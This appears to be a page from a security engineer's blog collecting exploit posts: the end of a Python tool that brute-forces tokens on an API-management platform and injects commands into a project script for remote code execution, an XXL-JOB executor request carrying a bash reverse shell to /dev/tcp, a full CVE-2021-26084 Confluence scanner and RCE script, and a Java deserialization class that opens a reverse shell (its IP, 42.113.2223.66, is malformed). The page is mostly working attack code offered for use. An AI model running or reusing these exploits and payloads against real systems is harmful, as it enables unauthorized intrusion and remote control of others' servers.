old_after_script&#125;)</span><br><span class="line">    data = response.json()</span><br><span class="line">    return data[&#x27;errcode&#x27;] == 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@click.group()</span><br><span class="line">@click.option(&#x27;--debug&#x27;, &#x27;debug&#x27;, is_flag=True, type=bool, required=False, default=False)</span><br><span class="line">def cli(debug):</span><br><span class="line">    if debug:</span><br><span class="line">        logger.setLevel(&#x27;DEBUG&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@cli.command(&#x27;enc&#x27;)</span><br><span class="line">@click.argument(&#x27;data&#x27;, type=str, required=True)</span><br><span class="line">def cmd_enc(data: str):</span><br><span class="line">    click.echo(aes_encode(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@cli.command(&#x27;dec&#x27;)</span><br><span class="line">@click.argument(&#x27;data&#x27;, type=str, required=True)</span><br><span class="line">def cmd_dec(data: str):</span><br><span class="line">    click.echo(aes_decode(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@cli.command(&#x27;token&#x27;)</span><br><span class="line">@click.option(&#x27;-u&#x27;, &#x27;--url&#x27;, type=str, required=True)</span><br><span class="line">@click.option(&#x27;-c&#x27;, &#x27;--count&#x27;, type=int, default=5)</span><br><span class="line">def cmd_token(url, count):</span><br><span class="line">    already = []</span><br><span class="line">    for i in range(count):</span><br><span class="line">        token = brute_token(url, already)</span><br><span class="line">        if not token:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        click.echo(f&#x27;find a valid token: &#123;token&#125;&#x27;)</span><br><span class="line">        already.append(token)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@cli.command(&#x27;owner&#x27;)</span><br><span class="line">@click.option(&#x27;-u&#x27;, &#x27;--url&#x27;, type=str, required=True)</span><br><span class="line">@click.option(&#x27;-t&#x27;, &#x27;--token&#x27;, &#x27;token&#x27;, type=str, required=True, help=&#x27;Token that get from first step&#x27;)</span><br><span class="line">def cmd_owner(url, token):</span><br><span class="line">    aid = find_owner_uid(url, token)</span><br><span class="line">    e = aes_encode(f&#x27;&#123;aid&#125;|&#123;token&#125;&#x27;)</span><br><span class="line">    click.echo(f&#x27;your owner id is: &#123;aid&#125;, encrypted token is &#123;e&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@cli.command(&#x27;project&#x27;)</span><br><span class="line">@click.option(&#x27;-u&#x27;, &#x27;--url&#x27;, type=str, required=True)</span><br><span class="line">@click.option(&#x27;-o&#x27;, &#x27;--owner-id&#x27;, &#x27;owner&#x27;, type=str, required=True)</span><br><span class="line">@click.option(&#x27;-t&#x27;, &#x27;--token&#x27;, &#x27;token&#x27;, type=str, required=True, help=&#x27;Token that get from first step&#x27;)</span><br><span class="line">def cmd_project(url, owner, token):</span><br><span class="line">    token = aes_encode(f&#x27;&#123;owner&#125;|&#123;token&#125;&#x27;)</span><br><span class="line">    project = find_project(url, token)</span><br><span class="line">    if project:</span><br><span class="line">        logger.info(&#x27;[+] project by this token: %r&#x27;, project)</span><br><span class="line">        click.echo(f&#x27;your project id is: &#123;project[&quot;_id&quot;]&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@cli.command(&#x27;col&#x27;)</span><br><span class="line">@click.option(&#x27;-u&#x27;, &#x27;--url&#x27;, type=str, required=True)</span><br><span class="line">@click.option(&#x27;-o&#x27;, &#x27;--owner-id&#x27;, &#x27;owner&#x27;, type=str, required=True)</span><br><span class="line">@click.option(&#x27;-t&#x27;, &#x27;--token&#x27;, &#x27;token&#x27;, type=str, required=True, help=&#x27;Token that get from first step&#x27;)</span><br><span class="line">@click.option(&#x27;--from&#x27;, &#x27;brute_from&#x27;, type=int, required=False, default=1, help=&#x27;Brute Col id from this number&#x27;)</span><br><span class="line">@click.option(&#x27;--to&#x27;, &#x27;brute_to&#x27;, type=int, required=False, default=200, help=&#x27;Brute Col id to this number&#x27;)</span><br><span class="line">def cmd_col(url, owner, token, brute_from, brute_to):</span><br><span class="line">    token = aes_encode(f&#x27;&#123;owner&#125;|&#123;token&#125;&#x27;)</span><br><span class="line">    for i in find_col(url, token, brute_from, brute_to):</span><br><span class="line">        click.echo(f&#x27;found a valid col id: &#123;i&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@cli.command(&#x27;rce&#x27;)</span><br><span class="line">@click.option(&#x27;-u&#x27;, &#x27;--url&#x27;, type=str, required=True)</span><br><span class="line">@click.option(&#x27;-o&#x27;, &#x27;--owner-id&#x27;, &#x27;owner&#x27;, type=str, required=True)</span><br><span class="line">@click.option(&#x27;-t&#x27;, &#x27;--token&#x27;, &#x27;token&#x27;, type=str, required=True, help=&#x27;Token that get from first step&#x27;)</span><br><span class="line">@click.option(&#x27;--pid&#x27;, &#x27;project_id&#x27;, type=int, required=True)</span><br><span class="line">@click.option(&#x27;--cid&#x27;, &#x27;col_id&#x27;, type=int, required=True)</span><br><span class="line">@click.option(&#x27;-c&#x27;, &#x27;--command&#x27;, &#x27;command&#x27;, type=str, required=True, help=&#x27;Command that you want to execute&#x27;)</span><br><span class="line">def cmd_rce(url, owner, token, project_id, col_id, command):</span><br><span class="line">    token = aes_encode(f&#x27;&#123;owner&#125;|&#123;token&#125;&#x27;)</span><br><span class="line">    project = find_project(url, token, project_id)</span><br><span class="line">    if not project:</span><br><span class="line">        click.echo(&#x27;[-] failed to get project&#x27;)</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    old_after_script = project.get(&#x27;after_script&#x27;, &#x27;&#x27;)</span><br><span class="line">    if not update_project(url, token, project_id, command):</span><br><span class="line">        click.echo(&#x27;[-] failed to update project&#x27;)</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    output = run_auto_test(url, token, col_id)</span><br><span class="line">    if output:</span><br><span class="line">        click.echo(output)</span><br><span class="line">        clear_project(url, token, project_id, old_after_script)</span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line">    clear_project(url, token, project_id, old_after_script)</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@cli.command(&#x27;one4all&#x27;)</span><br><span class="line">@click.option(&#x27;-u&#x27;, &#x27;--url&#x27;, type=str, required=True)</span><br><span class="line">@click.option(&#x27;--count&#x27;, type=int, default=5)</span><br><span class="line">@click.option(&#x27;-c&#x27;, &#x27;--command&#x27;, type=str, default=&#x27;id&#x27;)</span><br><span class="line">def cmd_one4all(url, count, command):</span><br><span class="line">    already = []</span><br><span class="line">    for i in range(count):</span><br><span class="line">        token = brute_token(url, already)</span><br><span class="line">        if not token:</span><br><span class="line">            logger.info(&#x27;[-] no new token found, exit...&#x27;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        already.append(token)</span><br><span class="line">        logger.info(&#x27;[+] find a new token: %s&#x27;, token)</span><br><span class="line">        owner_id = find_owner_uid(url, token)</span><br><span class="line">        if not owner_id:</span><br><span class="line">            logger.info(&#x27;[-] failed to find the owner id using token %s&#x27;, token)</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        etoken = aes_encode(f&#x27;&#123;owner_id&#125;|&#123;token&#125;&#x27;)</span><br><span class="line">        logger.info(&#x27;[+] find a new owner id: %r, encrypted token: %s&#x27;, owner_id, etoken)</span><br><span class="line">        project = find_project(url, etoken)</span><br><span class="line">        if not project:</span><br><span class="line">            logger.info(&#x27;[-] failed to find project using token %s&#x27;, token)</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        project_id = project[&#x27;_id&#x27;]</span><br><span class="line">        logger.info(&#x27;[+] project_id = %s, project = %r&#x27;, project_id, project)</span><br><span class="line">        col_ids = find_col(url, etoken, 1, 200)</span><br><span class="line">        if not col_ids:</span><br><span class="line">            logger.info(&#x27;[+] failed to find cols in project %s, try next project...&#x27;, project_id)</span><br><span class="line"></span><br><span class="line">        for col_id in col_ids:</span><br><span class="line">            logger.info(&#x27;[+] col_id = %s&#x27;, col_id)</span><br><span class="line">            click.echo(f&#x27;hit: project_id: &#123;project_id&#125; | owner_id: &#123;owner_id&#125; | col_id: &#123;col_id&#125; | token: &#123;token&#125;&#x27;)</span><br><span class="line">            click.echo(f&#x27;suggestion: python &#123;sys.argv[0]&#125; rce -u &#123;url&#125; -t &#123;token&#125; -o &#123;owner_id&#125; --pid &#123;project_id&#125; --cid &#123;col_id&#125; --command=&quot;&#123;command&#125;&quot;&#x27;)</span><br><span class="line"></span><br><span class="line">            if cmd_rce.callback(url, owner_id, token, project_id, col_id, command):</span><br><span class="line">                return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    cli()</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/xxl-job-executor%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/xxl-job-executor%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">xxl-job executor未授权访问漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 09:49:52 / 修改时间：09:50:24" itemprop="dateCreated datePublished" datetime="2024-09-10T09:49:52+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="0x1-漏洞影响"><a href="#0x1-漏洞影响" class="headerlink" title="0x1 漏洞影响"></a>0x1 漏洞影响</h1><p>XXL-JOB &lt;&#x3D; 2.2.0</p>
<h1 id="0x2-漏洞分析"><a href="#0x2-漏洞分析" class="headerlink" title="0x2 漏洞分析"></a>0x2 漏洞分析</h1><p>XXL-JOB的Restful API分为两种，一个 调度中心Restful API，一个 执行器Restful API。其中在执行器Restful API的任务触发声明中，发送请求的数据格式为：</p>
<h1 id="0x3-glueType”-”BEAN”-任务模式的选值如下"><a href="#0x3-glueType”-”BEAN”-任务模式的选值如下" class="headerlink" title="0x3 glueType”:”BEAN” 任务模式的选值如下"></a>0x3 glueType”:”BEAN” 任务模式的选值如下</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BEAN(&quot;BEAN&quot;, false, null, null),</span><br><span class="line">GLUE_GROOVY(&quot;GLUE(Java)&quot;, false, null, null),</span><br><span class="line">GLUE_SHELL(&quot;GLUE(Shell)&quot;, true, &quot;bash&quot;, &quot;.sh&quot;), </span><br><span class="line">GLUE_PYTHON(&quot;GLUE(Python)&quot;, true, &quot;python&quot;, &quot;.py&quot;), </span><br><span class="line">GLUE_PHP(&quot;GLUE(PHP)&quot;, true, &quot;php&quot;, &quot;.php&quot;), </span><br><span class="line">GLUE_NODEJS(&quot;GLUE(Nodejs)&quot;, true, &quot;node&quot;, &quot;.js&quot;), </span><br><span class="line">GLUE_POWERSHELL(&quot;GLUE(PowerShell)&quot;, true, &quot;powershell&quot;, &quot;.ps1&quot;);</span><br></pre></td></tr></table></figure>

<h1 id="x4-POC"><a href="#x4-POC" class="headerlink" title="-x4 POC"></a>-x4 POC</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /run HTTP/1.1</span><br><span class="line">Host: ip:9999</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 394</span><br><span class="line"> </span><br><span class="line">&#123;</span><br><span class="line">  &quot;jobId&quot;: 1,</span><br><span class="line">  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,</span><br><span class="line">  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,</span><br><span class="line">  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,</span><br><span class="line">  &quot;executorTimeout&quot;: 0,</span><br><span class="line">  &quot;logId&quot;: 1,</span><br><span class="line">  &quot;logDateTime&quot;: 1586629003729,</span><br><span class="line">  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,</span><br><span class="line">  &quot;glueSource&quot;: &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.30.1/5555 0&gt;&amp;1&quot;,</span><br><span class="line">  &quot;glueUpdatetime&quot;: 1586699003758,</span><br><span class="line">  &quot;broadcastIndex&quot;: 0,</span><br><span class="line">  &quot;broadcastTotal&quot;: 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/Confluence-Servers-CVE-2021-26084/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/Confluence-Servers-CVE-2021-26084/" class="post-title-link" itemprop="url">Confluence Servers-CVE-2021-26084</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 09:49:14 / 修改时间：11:45:39" itemprop="dateCreated datePublished" datetime="2024-09-10T09:49:14+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">@File    :   PoC.py</span><br><span class="line">@Time    :   2021/09/01 14:16:26</span><br><span class="line">@Author  :   _0xf4n9x_</span><br><span class="line">@Version :   1.0</span><br><span class="line">@Contact :   fanq.xu@gmail.com</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import urllib3</span><br><span class="line">import argparse</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">proxy = &#123;</span><br><span class="line">    &#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;,</span><br><span class="line">    &#x27;https&#x27;: &#x27;http://127.0.0.1:8080&#x27;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def usage():</span><br><span class="line">    print(&quot;Eg: \n    python3 PoC.py -u http://127.0.0.1&quot;)</span><br><span class="line">    print(&quot;    python3 PoC.py -u httts://127.0.0.1 -e &#x27;cat /etc/passwd&#x27;&quot;)</span><br><span class="line">    print(&quot;    python3 PoC.py -f urls.txt&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def poc(host):</span><br><span class="line">    paths = [&#x27;/pages/createpage-entervariables.action?SpaceKey=x&#x27;, &#x27;/pages/createpage-entervariables.action&#x27;, &#x27;/confluence/pages/createpage-entervariables.action?SpaceKey=x&#x27;, &#x27;/confluence/pages/createpage-entervariables.action&#x27;, &#x27;/wiki/pages/createpage-entervariables.action?SpaceKey=x&#x27;, &#x27;/wiki/pages/createpage-entervariables.action&#x27;, &#x27;/pages/doenterpagevariables.action&#x27;, &#x27;/pages/createpage.action?spaceKey=myproj&#x27;, &#x27;/pages/templates2/viewpagetemplate.action&#x27;, &#x27;/pages/createpage-entervariables.action&#x27;, &#x27;/template/custom/content-editor&#x27;, &#x27;/templates/editor-preload-container&#x27;, &#x27;/users/user-dark-features&#x27;]</span><br><span class="line">    for path in paths:</span><br><span class="line">        url = host + path</span><br><span class="line">        headers = &#123;</span><br><span class="line">            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1&quot;,</span><br><span class="line">            &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125;</span><br><span class="line">        num1 = random.randint(100, 10000)</span><br><span class="line">        num2 = random.randint(100, 10000)</span><br><span class="line">        sum = num1 * num2</span><br><span class="line">        params = &#123;</span><br><span class="line">        &quot;queryString&quot;: &quot;aaaa\\u0027+&#123;&quot; + str(num1) + &quot;*&quot; + str(num2) + &quot;&#125;+\\u0027bbb&quot;&#125;</span><br><span class="line">        try:</span><br><span class="line">            res = requests.post(url, headers=headers, data=params,</span><br><span class="line">                                timeout=6, verify=False, proxies=None)</span><br><span class="line">            if str(sum) in res.text:</span><br><span class="line">                print(&quot;[+] &quot; + host + path + &quot; is vulnerable!&quot;)</span><br><span class="line">                return path</span><br><span class="line">            else:</span><br><span class="line">                continue</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">    print(&quot;[-] &quot; + host + &quot; is not vulnerable!&quot;)</span><br><span class="line">    return 0</span><br><span class="line"></span><br><span class="line">def exp(host, command, path):</span><br><span class="line">    url = host + path</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125;</span><br><span class="line">    params = &#123;</span><br><span class="line">        &quot;queryString&quot;: &quot;aaaaaaaa\\u0027+&#123;Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022&quot; + command + &quot;\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin)&#123;p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); &#125; else&#123;p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); &#125;p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null)&#123;output = output + line + java.lang.Character.toString(10); &#125;\\u0027)&#125;+\\u0027&quot;&#125;</span><br><span class="line"></span><br><span class="line">    res = requests.post(url, headers=headers, data=params,</span><br><span class="line">                        timeout=6, verify=False, proxies=None).text</span><br><span class="line">    soup = BeautifulSoup(res, &quot;html5lib&quot;)</span><br><span class="line">    # content = soup.find(method=&quot;POST&quot;).find_all(&#x27;input&#x27;)[1][&quot;value&quot;]</span><br><span class="line">    content = soup.find(&#x27;input&#x27;, attrs=&#123;&#x27;name&#x27;: &#x27;queryString&#x27;, &#x27;type&#x27;: &#x27;hidden&#x27;&#125;)[</span><br><span class="line">        &#x27;value&#x27;]</span><br><span class="line"></span><br><span class="line">    print(content.replace(&#x27;aaaaaaaa[&#x27;, &#x27;&#x27;).replace(&#x27;\n]&#x27;, &#x27;&#x27;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=&quot;CVE-2021-26084 Remote Code Execution on Confluence Servers&quot;)</span><br><span class="line">    parser.add_argument(&#x27;-u&#x27;, &#x27;--url&#x27;, type=str,</span><br><span class="line">                        help=&quot;vulnerability verification for individual websites&quot;)</span><br><span class="line">    parser.add_argument(&#x27;-e&#x27;, &#x27;--exec&#x27;, type=str,</span><br><span class="line">                        help=&quot;command execution&quot;)</span><br><span class="line">    parser.add_argument(&#x27;-f&#x27;, &#x27;--file&#x27;, type=str,</span><br><span class="line">                        help=&quot;perform vulnerability checks on multiple websites in a file, and the vulnerable websites will be output to the success.txt file&quot;)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    if len(sys.argv) == 3:</span><br><span class="line">        if sys.argv[1] in [&#x27;-u&#x27;, &#x27;--url&#x27;]:</span><br><span class="line">            poc(args.url)</span><br><span class="line">        elif sys.argv[1] in [&#x27;-f&#x27;, &#x27;--file&#x27;]:</span><br><span class="line">            if os.path.isfile(args.file) == True:</span><br><span class="line">                with open(args.file) as target:</span><br><span class="line">                    hosts = []</span><br><span class="line">                    hosts = target.read().splitlines()</span><br><span class="line">                    for host in hosts:</span><br><span class="line">                        if poc(host) != 0:</span><br><span class="line">                            with open(&quot;success.txt&quot;, &quot;a+&quot;) as f:</span><br><span class="line">                                f.write(host + &quot;\n&quot;)</span><br><span class="line">    elif len(sys.argv) == 5:</span><br><span class="line">        if set([sys.argv[1], sys.argv[3]]) &lt; set([&#x27;-u&#x27;, &#x27;--url&#x27;, &#x27;-e&#x27;, &#x27;--exec&#x27;]):</span><br><span class="line">            path = poc(args.url)</span><br><span class="line">            if path != 0:</span><br><span class="line">                exp(args.url, args.exec, path)</span><br><span class="line">    else:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        usage()</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/0xf4n9x/CVE-2021-26084/blob/main/PoC.py">https://github.com/0xf4n9x/CVE-2021-26084/blob/main/PoC.py</a><br><a target="_blank" rel="noopener" href="https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md">https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B1%BB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B1%BB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/" class="post-title-link" itemprop="url">java反序列化类漏洞利用方法</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 09:47:54 / 修改时间：09:50:26" itemprop="dateCreated datePublished" datetime="2024-09-10T09:47:54+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="0x1-编译反弹shell的类"><a href="#0x1-编译反弹shell的类" class="headerlink" title="0x1 编译反弹shell的类"></a>0x1 编译反弹shell的类</h1><p><code>javac poc.java</code></p>
<p>poc.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/42.113.2223.66/7111 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
